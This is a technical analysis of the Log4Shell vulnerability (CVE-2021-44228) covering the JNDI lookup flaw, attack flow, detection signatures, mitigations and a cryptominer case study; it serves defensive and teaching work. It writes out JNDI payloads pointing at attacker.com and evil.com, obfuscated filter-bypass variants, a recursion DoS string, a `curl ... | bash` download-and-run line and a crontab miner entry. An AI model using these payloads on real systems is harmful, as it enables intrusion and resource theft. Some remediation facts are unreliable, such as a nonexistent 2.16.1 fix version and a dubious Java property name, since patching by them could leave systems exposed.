# Log4j Vulnerability: CVE-2021-44228 (Log4Shell)
## Comprehensive Technical Analysis, Exploitation, and Mitigation

**Report Date:** November 27, 2025  
**Classification:** Technical Security Analysis  
**Vulnerability ID:** CVE-2021-44228 (Log4Shell)  
**Related CVEs:** CVE-2021-45046, CVE-2021-45105, CVE-2021-44832  
**CVSS Score:** 10.0 (Critical)  
**Discovery Date:** December 9, 2021  
**Current Status:** Actively exploited - ongoing campaigns through 2025  

---

## Executive Summary

On December 9, 2021, Apache Log4j 2 remote code execution (RCE) vulnerability (CVE-2021-44228), colloquially known as "Log4Shell," was discovered being actively exploited in the wild. This critical vulnerability affects Apache Log4j 2 versions 2.0-beta9 through 2.14.1 and has become one of the most widespread and dangerous vulnerabilities in modern software history[1][2].

Log4Shell exploits the Java Naming and Directory Interface (JNDI) feature in Log4j's message lookup substitution functionality. By crafting specially formatted log messages containing JNDI expressions, attackers can trigger remote code execution with a single HTTP request to vulnerable systems. The vulnerability requires zero user interaction and is trivial to exploit—proof-of-concept code was published immediately after discovery[1][2].

**Critical Impact:**
- **Affected systems:** Millions of Java applications worldwide (all sectors: government, finance, healthcare, technology, retail)
- **Exploitation difficulty:** Trivial (even script kiddies can exploit)
- **Attack surface:** Any log input (HTTP headers, request parameters, API payloads)
- **Campaigns:** Massive, ongoing exploitation detected from December 2021 through November 2025[1][2][3]
- **Payload diversity:** Cryptomining, ransomware, botnets, worms, espionage, backdoor deployment
- **Estimated impact:** Billions of dollars in incident response, system remediation, and business disruption

---

## 1. Vulnerability Origins & Discovery

### 1.1 Apache Log4j Library Background

Apache Log4j is one of the most widely used Java logging libraries globally. It provides:

- Application event logging and debugging
- Error tracking and reporting
- Performance monitoring integration
- Structured logging with multiple output formats
- Configuration flexibility via XML/properties files
- Message formatting and pattern replacement

**Ubiquity:**
Log4j is embedded in countless software applications across all industries:
- Cloud infrastructure (AWS, Azure, GCP logging)
- Web applications and APIs
- Big Data platforms (Elasticsearch, Kafka, Hadoop)
- Enterprise software (SAP, Oracle, Microsoft products)
- Mobile app backends
- IoT device management systems
- Government and military information systems[1][2]

### 1.2 Discovery & Public Disclosure

**December 9, 2021 - Initial Discovery:**
- Security researcher identified Log4j vulnerability
- Apache Log4j core team notified
- Proof-of-concept exploit code released publicly
- Mass exploitation attempts began immediately
- Threat actors began weaponizing the vulnerability within hours[1][2]

**Patch Timeline:**
- **December 10**: Apache releases Log4j 2.15.0 (initial patch)
- **December 13**: CVE-2021-45046 discovered (bypass of initial patch)
- **December 17**: Log4j 2.16.0 released with more comprehensive fix
- **December 17**: CVE-2021-45105 discovered (DoS via recursion)
- **December 28**: CVE-2021-44832 discovered (JDBC Appender RCE)
- **January 2022+**: Additional bypass techniques discovered and patched

**Ongoing Threat:**
Despite patches released over three years ago, Log4j exploitation remains active in 2025 due to widespread unpatched systems in production environments[2][3]

---

## 2. Technical Vulnerability Analysis

### 2.1 Root Cause: JNDI Message Lookup Feature

**Message Lookup Substitution:**

Apache Log4j includes a feature that performs variable substitution within log messages. When developers log data, they can reference variables using special syntax:

logger.info("User: ${variable_name}");

During logging, Log4j replaces `${variable_name}` with its actual value.

**Supported Lookup Types:**
- `${java:version}` - JVM version
- `${env:PATH}` - Environment variables
- `${sys:user.name}` - System properties
- `${jndi:ldap://...}` - JNDI directory service lookup
- `${jndi:rmi://...}` - RMI registry lookup

**The Vulnerability:**

The JNDI lookup feature is intended for developers to dynamically retrieve values from LDAP or RMI servers. However, **message lookup is enabled by default**, and critically, **user input is logged without sanitization**.

When attacker-controlled data (HTTP headers, URL parameters, JSON payloads) is logged directly into Log4j, and that data contains JNDI expressions, Log4j will:

1. Parse the JNDI expression
2. Attempt to resolve it against an attacker-controlled LDAP/RMI server
3. Download a malicious Java class object
4. Instantiate the malicious class in-memory
5. Execute arbitrary code during class instantiation

**Example Attack Vector:**

HTTP Request:
GET / HTTP/1.1
User-Agent: ${jndi:ldap://attacker.com/ExploitPayload}

Log4j Processing:
Application calls: logger.info("Request from: " + request.getUserAgent());
Resulting log message: "Request from: ${jndi:ldap://attacker.com/ExploitPayload}"

Log4j interprets the JNDI expression and resolves it
Attacker's LDAP server serves malicious Java class
RCE achieved on the vulnerable system

### 2.2 Exploitation Mechanism: JNDI Injection Attack

**Attack Flow (Step-by-Step):**

Attacker                          Vulnerable App                    Attacker Infrastructure
                                  (Log4j 2.14.1 or earlier)
    │                             │                                 │
    ├─ 1. Craft malicious         │                                 │
    │      HTTP request w/        │                                 │
    │      JNDI payload           │                                 │
    │                             │                                 │
    ├────────────────────────────>│                                 │
    │  GET /?search=              │                                 │
    │  ${jndi:ldap://evil.com     │                                 │
    │  /ExploitPayload}           │                                 │
    │                             │                                 │
    │                             │ 2. Log the request param        │
    │                             │    without sanitization        │
    │                             │    logger.info(request         │
    │                             │    .getParameter("search"))    │
    │                             │                                 │
    │                             │ 3. Log4j parses the ${...}    │
    │                             │    and recognizes JNDI lookup  │
    │                             │                                 │
    │                             │ 4. Resolve JNDI reference to   │
    │                             │    ldap://evil.com/ExploitP... │
    │                             │                                 │
    │                             ├────────────────────────────────>│
    │                             │    LDAP Lookup Request         │
    │                             │    Fetch: ExploitPayload       │
    │                             │                                 │
    │                             │<────────────────────────────────┤
    │                             │    LDAP Response with Ref to   │
    │                             │    http://evil.com/Exploit...  │
    │                             │                                 │
    │                             │ 5. Follow referral to HTTP URL │
    │                             ├────────────────────────────────>│
    │                             │    HTTP GET /ExploitPayload.   │
    │                             │    class                        │
    │                             │                                 │
    │                             │<────────────────────────────────┤
    │                             │    200 OK                       │
    │                             │    [Malicious .class bytecode] │
    │                             │                                 │
    │                             │ 6. Load & instantiate the class│
    │                             │    (Constructor executes code) │
    │                             │                                 │
    │<───────────────────────────────RCE Complete──────────────────│
    │    Attacker gains code       Code executes in app context    │
    │    execution on vulnerable   with app privileges             │
    │    system                    │

### 2.3 Java Deserialization Gadgets

**Why Code Execution Occurs:**

The JNDI referral points to a malicious .class file (serialized Java bytecode). When the vulnerable application loads this class:

1. **Class instantiation:** Java creates an instance of the malicious class
2. **Constructor execution:** The constructor method runs during instantiation
3. **Gadget chain exploitation:** If attackers use known Java deserialization gadgets (collections of classes that chain method calls), complex code can be executed

**Common Gadgets:**
- **CommonsCollections:** Used in many public exploits (e.g., `ysoserial`)
- **Spring Framework:** Targets applications using Spring dependencies
- **JDOM:** XML processing library with exploitable chains
- **Rome:** RSS feed parsing with gadget chains

**Version Dependency:**

Exploitation success depends on Java version and available libraries:
- **Java 8u191+, 7u201+, 6u211+:** `com.sun.jndi.ldap.connect.pool` default is false (harder to exploit)
- **Earlier Java versions:** More permissive JNDI behavior enables direct RCE
- **Available gadgets:** Depends on application's classpath (commonly available libraries)

### 2.4 Related Vulnerabilities

**CVE-2021-45046 (Bypass of 2.15.0 Patch):**
- Initial patch was incomplete
- Thread context lookups could still be exploited
- Attacker could still achieve RCE in specific configurations
- Fixed in Log4j 2.16.0 and 2.12.2

**CVE-2021-45105 (Denial of Service):**
- Self-referential lookup patterns cause infinite recursion
- Applications crash due to stack overflow
- Less critical than RCE but still dangerous
- Example: `${${::-${::-${}}}}`

**CVE-2021-44832 (JDBC Appender RCE):**
- Requires attacker to modify logging configuration file
- Less common but still critical
- Exploits JDBC connection string parameters

---

## 3. Exploitation Techniques & Payload Development

### 3.1 Proof-of-Concept Exploitation

**Minimal PoC Payload:**

${jndi:ldap://attacker-ip/cn=ExploitPayload,dc=evil,dc=com}

This payload, when logged by a vulnerable Log4j instance, triggers:
1. LDAP lookup to attacker server
2. Download of malicious Java class
3. Code execution

**Real-World Attack Examples (December 2021 - January 2022):**

Attack 1 - User-Agent Header Injection:
User-Agent: ${jndi:ldap://attacker.com/a}

Attack 2 - Encoded Payload to Bypass Filters:
${jndi:${lower:ldap}://attacker.com/a}
(Uses substring lookup to construct "ldap" dynamically)

Attack 3 - Multi-layer Encoding:
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
(Constructs "jndi:ldap" character-by-character)

### 3.2 Attacker Infrastructure Setup

**Attacker Requirements:**

1. **LDAP Server:**
   - Can be standard LDAP server or custom tool
   - Serves referral responses pointing to attacker's HTTP server
   - Example: `ysoserial-commons-collections-ldap-server`

2. **HTTP Server:**
   - Hosts serialized Java objects (.class files)
   - Returns malicious bytecode
   - Gadget chains embedded in .class files

3. **Command & Control (C2):**
   - Receives output from executed commands
   - Sends additional payloads
   - Often uses DNS tunneling for exfiltration

**Attack Flow:**

1. Attacker sets up LDAP server
2. Attacker generates malicious .class files with ysoserial
3. Attacker posts JNDI payloads in public exploits (Twitter, GitHub)
4. Mass internet scanning begins
5. Public infrastructure automatically exploits vulnerable systems
6. C2 callback provides attacker with shell access

### 3.3 Payload Diversification (December 2021 - Present)

**Early Campaigns (Dec 2021):**
- Mass scanning for vulnerable instances
- Cryptocurrency miners (Kinsing, XMRig)
- Information harvesting (/etc/passwd exfiltration)
- Simple shell command execution

**Mid-2022 Campaigns:**
- Ransomware deployment (LockBit, Cl0p, others)
- APT campaigns for credential theft
- Worm-like propagation to adjacent systems
- Targeted data exfiltration

**Recent Campaigns (2024-2025):**
- Sophisticated backdoor deployment
- Nation-state adversary engagement[2]
- Multi-stage attack chains
- Advanced evasion techniques
- Fileless execution and memory-resident malware

---

## 4. Mass Exploitation & Attack Scale

### 4.1 December 2021 Attack Wave

**Global Scanning Campaign:**

Within hours of PoC release, attackers began mass scanning for vulnerable systems:

- **70+ million exploit strings** detected in network traffic (Dec 10-31, 2021)
- **80%+ of all Log4j exploitation** was mass vulnerability scanning
- **49% of exploit strings** found in top 6 HTTP request fields:
  - User-Agent header
  - Referer header
  - X-Forwarded-For header
  - URL query parameters
  - Request body
  - Custom HTTP headers

**Geographic Distribution:**

Exploitation attempts originated from:
- Hosting providers and cloud infrastructure
- Compromised botnet nodes
- Residential proxy networks
- Nation-state IP ranges

**Attack Diversity:**

Top callback C2 infrastructure by frequency:
- DNS tunneling domains
- Bulletproof hosting providers
- Defunct company infrastructure
- Honeypots for malware analysis

### 4.2 Data Exfiltration Patterns

**Information Gathered by Attackers:**

When successful, attackers exfiltrated:

1. **System Configuration:**
   - `/etc/passwd` file contents
   - Environment variable names and values
   - Sensitive configuration files
   - API keys embedded in environment

2. **Application Details:**
   - Running processes and services
   - Installed software versions
   - Network configuration
   - User privileges and permissions

3. **Data Staging:**
   - Exfiltration via DNS tunneling: `[hostname].[base64-encoded-data].[chunk-number].attacker-domain`
   - Multiple connections for large data sets
   - Evasion of network monitoring

### 4.3 Ongoing Exploitation (2022-2025)

**Campaign Evolution:**

While initial mass scanning declined after 2021, Log4j exploitation remains ongoing:

- **2022-2023:** Targeted attacks on government agencies, defense contractors, financial institutions
- **2023-2024:** Increased sophistication; multi-stage attack chains
- **2024-2025:** Integration with AI-assisted malware development; targeted espionage campaigns[2]

**Threat Actor Categories:**

1. **Script Kiddies:** Using automated tools and public exploits
2. **Organized Cybercriminals:** Ransomware deployment, financial fraud
3. **Nation-State Adversaries:** Targeted espionage and supply chain attacks
4. **Hacktivists:** Opportunistic attacks on targets of interest

---

## 5. Detection & Indicators of Compromise

### 5.1 Network-Based Detection

**Network Traffic Indicators:**

1. **HTTP/HTTPS Request Patterns:**
   - JNDI string patterns in HTTP headers or body: `${jndi:ldap://`, `${jndi:rmi://`
   - Encoded variants: `${lower:ldap}`, `${upper:ldap}`
   - Character-by-character construction bypasses: `${::-j}${::-n}${::-d}${::-i}`
   - Base64-encoded JNDI payloads in POST bodies

2. **DNS Resolution Anomalies:**
   - DNS queries to suspicious domains (newly registered, bulletproof hosting)
   - DNS tunneling patterns with unusual query structure
   - High-volume DNS queries from single source
   - TXT record queries (data exfiltration via DNS)

3. **Outbound Connection Patterns:**
   - LDAP protocol connections to external IPs (unusual in most environments)
   - RMI-IIOP connections to non-trusted networks
   - HTTP connections to suspicious IP addresses
   - Connections to known malicious infrastructure[3]

### 5.2 Host-Based Detection

**File System Indicators:**

1. **Log File Anomalies:**
   - JNDI string patterns in application logs
   - `${jndi:` or variants in log files (application should not log this)
   - Unusual error messages indicating JNDI lookup failures
   - Exception stack traces referencing JNDI/LDAP classes

2. **Process Execution Indicators:**
   - Unexpected child processes from Java applications (indicating command execution)
   - Download of files to `/tmp` or other temporary directories
   - Bash/PowerShell process spawn from Java runtime
   - Curl/wget commands executing from application context

3. **File Modifications:**
   - Creation of new executables in unexpected locations
   - Modification of system files or configuration
   - Creation of persistence mechanisms (crontab, systemd services)

### 5.3 Application-Level Detection

**Log4j Configuration Analysis:**

1. **Version Detection:**
   - Identify Log4j version in classpath: `log4j-core-2.x.x.jar`
   - Check version: vulnerable if 2.0-beta9 through 2.14.1 (unpatched)
   - Also vulnerable: 2.15.0 and 2.16.0 if not updated to 2.16.1+

2. **Message Lookup Configuration:**
   - Enable Message Lookup: Creates vulnerability
   - Disable Message Lookup: Mitigates vulnerability
   - Check `log4j2.xml` or `log4j2.properties` for configuration

3. **Runtime Monitoring:**
   - Monitor JNDI resolution attempts
   - Log all external connections from Java applications
   - Alert on JNDI lookup patterns in application logs

### 5.4 SIEM Detection Rules

**Log Pattern Signatures:**

Rule 1: Detect JNDI in Request Headers
- Match: HTTP requests containing "${jndi:" in any header
- Action: Alert - potential Log4j exploitation attempt

Rule 2: Detect JNDI Obfuscation Bypasses
- Match: "${}${" OR "${lower:" OR "${upper:" OR "${::-"
- Action: Alert - potential obfuscated Log4j payload

Rule 3: Detect LDAP/RMI Connections from Web Apps
- Match: Java process initiating LDAP or RMI-IIOP connections
- Action: Alert - unusual protocol for typical web application

Rule 4: Detect Command Execution Post-Exploitation
- Match: Shell command execution from Java process
- Action: Alert + investigate - likely successful exploitation

---

## 6. Defense & Mitigation Strategies

### 6.1 Immediate Mitigation (Pre-Patch)

**Application-Level Mitigations:**

1. **Disable Message Lookup:**
   - Set `log4j2.formatMsgNoLookups=true` in system properties
   - Command line: `java -Dlog4j2.formatMsgNoLookups=true ...`
   - Environment variable: `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`
   - Configuration file: Add to `log4j2.xml`
   - **Effect:** Prevents JNDI substitution from user input
   - **Limitation:** Does not prevent lookups in Log4j configuration itself

2. **JNDI Restriction (Java 8u121+, 11.0.1+, 13.0.1+):**
   - Set: `com.sun.jndi.ldap.object.trustURLCodebase=false` (default in newer Java)
   - Set: `com.sun.jndi.rmi.object.trustURLCodebase=false` (default in newer Java)
   - **Effect:** Prevents remote class loading via JNDI
   - **Limitation:** May break legitimate JNDI functionality

3. **LDAP Referral Restrictions:**
   - Disable LDAP referrals in JNDI configuration
   - Prevents exploitation via LDAP referral attacks
   - Java system property: `com.sun.jndi.ldap.connect.pool.referral=ignore`

**Network-Level Mitigations:**

1. **Egress Filtering:**
   - Block outbound LDAP (port 389, 636)
   - Block outbound RMI (port 1099 and ephemeral ports)
   - Block HTTP/HTTPS to untrusted domains
   - Whitelist only known-good external resources

2. **Ingress Filtering:**
   - Web Application Firewall (WAF) rules to block JNDI payloads
   - Pattern matching: block requests containing `${jndi:`
   - Rate limiting on suspicious requests
   - Geolocation-based blocking of suspicious sources

3. **DNS Filtering:**
   - Block DNS queries to known malicious domains
   - Monitor for DNS tunneling patterns
   - Alert on unusual DNS activity from servers

### 6.2 Short-Term Mitigation (During Patch Window)

**Log4j Version Management:**

1. **Inventory and Assessment:**
   - Identify all applications using Log4j
   - Determine Log4j versions in use (may be transitive dependency)
   - Classify by criticality and exposure

2. **Conditional Patching:**
   - **Highest Priority (0-24 hours):**
     - Internet-facing systems (web servers, APIs)
     - Systems processing user-controlled input
     - Systems exposed to untrusted networks

   - **High Priority (1-7 days):**
     - Internal applications with network exposure
     - Systems accessing sensitive data
     - Systems in critical business processes

   - **Medium Priority (1-4 weeks):**
     - Internal-only systems
     - Systems with network isolation
     - Non-critical services

3. **Staging & Testing:**
   - Test patches in non-production first
   - Verify application functionality post-patch
   - Check for dependency conflicts
   - Deploy patches via change management

### 6.3 Long-Term Hardening (Post-Patch)

**Architectural Changes:**

1. **Application Security:**
   - Input validation and sanitization
   - Never log untrusted input directly
   - Use parameterized logging where possible
   - Regular security code review

2. **Infrastructure Hardening:**
   - Defense in depth (multiple mitigation layers)
   - Network segmentation (restrict east-west traffic)
   - Zero-trust architecture implementation
   - Least privilege access controls

3. **Dependency Management:**
   - Software Bill of Materials (SBOM) tracking
   - Continuous vulnerability scanning
   - Automated patch management
   - Dependency pinning with security review

4. **Monitoring & Response:**
   - 24/7 security monitoring and alerting
   - Incident response plans and drills
   - Threat intelligence integration
   - Regular security assessments

---

## 7. Attack Campaign Case Study

### 7.1 Scenario: Cryptocurrency Mining Operation

**Attack Timeline:**

December 10, 2021 - Reconnaissance Phase:
- Attacker identifies vulnerable web application
- Application logs HTTP headers (no sanitization)
- Vulnerable Log4j 2.14.1 in classpath

December 11, 2021 - Initial Exploitation:
- Attacker crafts HTTP request with JNDI payload
- Payload injected in User-Agent header
- Log4j processes the header and triggers JNDI lookup
- Attacker's LDAP server provides malicious class reference

December 11, 2021 - Code Execution:
- Java application loads malicious .class file
- Bytecode contains serialized gadget chain
- CommonsCollections deserialization gadget executes arbitrary commands
- System executes: `curl http://attacker.com/miner.sh | bash`

December 11, 2021 - Malware Installation:
- `miner.sh` script downloaded and executed
- XMRig cryptocurrency miner installed in `/tmp`
- Persistence mechanism created via crontab: `0 * * * * /tmp/xmrig/miner -o pool.mining.com ...`
- Miner configured to use 50% of CPU resources

December 11 - December 31, 2021 - Cryptomining:
- Continuous cryptocurrency mining generates ~$5,000 profit
- Attacker infrastructure receives mining pool payouts
- Detection delayed due to:
  - High CPU usage attributed to legitimate load
  - Outbound traffic to mining pool not flagged
  - Crontab persistence not monitored

January 2, 2022 - Detection:
- System administrator notices excessive CPU usage
- Netstat reveals connections to mining pools
- Traces back to crontab entry
- Incident response initiated

January 3, 2022 - Incident Response:
- System isolated from network
- Malicious crontab entry removed
- XMRig process killed
- Log analysis reveals exploitation vector
- Log4j patched to 2.17.0
- Forensic analysis determines scope of compromise

**Root Cause Analysis:**
- Log4j vulnerability enabled initial exploitation
- HTTP headers logged without sanitization
- No egress filtering to prevent mining pool connections
- No endpoint monitoring for cryptocurrency miner signatures
- Patch not applied despite public availability

---

## 8. Conclusion & Recommendations

### 8.1 Log4Shell Lessons Learned

1. **Software Supply Chain Vulnerabilities Are Critical:**
   - Single vulnerability in widely-used library impacts millions of systems
   - Dependency management must prioritize security
   - Transitive dependencies often go unmonitored

2. **Logging Input Requires Caution:**
   - Never log untrusted input without sanitization
   - Language features (like JNDI lookups) can introduce unexpected risks
   - Default-enabled dangerous features are problematic

3. **Patch Speed Matters:**
   - Exploitation within hours of disclosure
   - Organizations need rapid patch deployment capability
   - Unpatched systems remain vulnerable years later (2025 exploitation still occurring)

4. **Defense in Depth Is Essential:**
   - No single mitigation prevents all exploitation
   - Multiple layers (application, network, host) necessary
   - Monitoring and incident response critical for compromise detection

### 8.2 Strategic Recommendations

**For Organizations:**

1. **Establish Vulnerability Management Program:**
   - Rapid response SLA for critical vulnerabilities (48 hours)
   - Inventory of all software components (SBOM)
   - Automated patch deployment capabilities
   - Security testing pre-deployment

2. **Implement Zero-Trust Architecture:**
   - Assume breach mentality
   - Verify all requests and connections
   - Least privilege access controls
   - Continuous monitoring and detection

3. **Invest in Security Tooling:**
   - Application scanning for vulnerable libraries (SCA)
   - Network monitoring and threat detection (IDS/IPS)
   - Endpoint detection and response (EDR)
   - Security Information and Event Management (SIEM)

4. **Build Security Culture:**
   - Security training for all staff
   - Secure coding practices
   - Incident response drills
   - Threat intelligence sharing

**For Software Developers:**

1. **Secure By Default:**
   - Dangerous features disabled by default
   - Security-first design
   - Deprecate risky patterns
   - Regular security updates

2. **Input Validation:**
   - Never trust user input
   - Validate and sanitize all external data
   - Use parameterized queries/logging
   - Document security assumptions

3. **Dependency Management:**
   - Pin dependency versions
   - Regularly update to security patches
   - Monitor for known vulnerabilities
   - Evaluate vendor security practices

---

## 9. Log4j Vulnerability Family Summary

| CVE ID | Affected Versions | Severity | Fix Version | Type |
|---|---|---|---|---|
| CVE-2021-44228 | 2.0-beta9 - 2.14.1 | Critical (10.0) | 2.15.0 | RCE via JNDI |
| CVE-2021-45046 | 2.15.0 | High (8.0) | 2.16.0 | RCE via bypass |
| CVE-2021-45105 | 2.0-beta9 - 2.16.0 | Medium (5.9) | 2.16.1 | DoS via recursion |
| CVE-2021-44832 | 2.0-beta9 - 2.17.0 | High (8.1) | 2.17.1 | RCE via JDBC |
| CVE-2022-23307 | 1.x - 1.2.17 | High (8.0) | 1.2.18 | RCE via deserialization |

---

## References

[1] Palo Alto Networks. (2024, June 5). Apache log4j Vulnerability CVE-2021-44228. https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/

[2] CrowdStrike. (2025, June 9). Log4j2 Vulnerability "Log4Shell" (CVE-2021-44228). https://www.crowdstrike.com/en-us/blog/log4j2-vulnerability-analysis-and-mitigation-recommendations/

[3] ZeroPath. (2025, July 16). Log4Shell Unleashed: Inside CVE-2021-44228. https://zeropath.com/blog/cve-2021-44228-log4shell-log4j-rce

[4] Rapid7. (2021, December 10). Critical Remote Code Execution in Apache Log4j. https://www.rapid7.com/blog/post/2021/12/10/widespread-exploitation-of-critical-remote-code-execution-in-apache-log4j/

[5] Indusface. (2024, August 22). Log4j Vulnerability – Technical Details. https://www.indusface.com/blog/log4j-vulnerability-technical-details/

[6] Uptycs. (2024, May 12). Inside Our Discovery of the Log4j Campaign and Its XMRig. https://www.uptycs.com/blog/threat-research-report-team/log4j-campaign-xmrig-malware

[7] Sysdig. (2025, July 25). Exploiting, Mitigating, and Detecting CVE-2021-44228. https://www.sysdig.com/blog/exploit-detect-mitigate-log4j-cve

[8] Darktrace. (2025, November 25). Analyzing Log4j Vulnerability in Crypto Mining Attack. https://www.darktrace.com/blog/exploring-a-crypto-mining-campaign-which-used-the-log-4j-vulnerability

[9] Microsoft. (2021, December 11). Guidance for preventing, detecting, and hunting for CVE-2021-44228. https://www.microsoft.com/en-us/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-

[10] Qualys. (2021, December 10). CVE-2021-44228: Log4Shell Apache Log4j2 Zero-Day Flaw. https://blog.qualys.com/vulnerabilities-threat-research/2021/12/10/apache-log4j2-zero-day-exploited-in-the-wild-log4shell

[11] Dynatrace. (2024, April 24). Log4j vulnerability explained: What is Log4Shell? https://www.dynatrace.com/news/blog/what-is-log4shell/

[12] Splunk. (2021, December 12). Log4Shell - Detecting Log4j Vulnerability (CVE-2021-44228). https://www.splunk.com/en_us/blog/security/log4shell-detecting-log4j-vulnerability-cve-2021-44228-continued.html
